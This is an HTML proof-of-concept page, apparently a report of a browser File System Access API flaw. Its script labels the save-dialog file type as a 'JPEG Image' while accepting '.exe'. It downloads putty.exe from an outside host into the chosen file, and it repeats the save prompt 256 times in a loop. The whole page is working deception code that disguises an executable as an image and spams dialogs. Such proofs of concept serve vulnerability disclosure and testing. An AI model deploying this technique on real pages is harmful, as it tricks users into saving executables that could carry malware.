<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>File System Access API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="favicon.png">
</head>

<body>
    <h3>File System Access API </h3>

    <hr>
    <h3>Code example/proof:</h3>
    <div style="display: flex; flex-direction: column">
        <div>
            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
        </div>

    </div>
    <script>

        const butSaveNewFile = document.getElementById('addNewFile')
        butSaveNewFile.addEventListener('mouseup', async () => {
            const options = {
                types: [
                    {
                        description:
                            'JPEG Image (*.jpeg)',
                        accept: {
                            'text/plain': ['.exe']
                        },
                        content: 'testetsteste'
                    }
                ]
            }
            debugger;
            
            for (let i = 0; i < 0x100; i++) {
            const handle = await window.showSaveFilePicker(options)
            const writable = await handle.createWritable()
            const response = await fetch('https://nfz.dev/putty.exe');
            await response.body.pipeTo(writable);
            alert('File saved')
            }
        })
    </script>
    <hr>

</body>

</html>
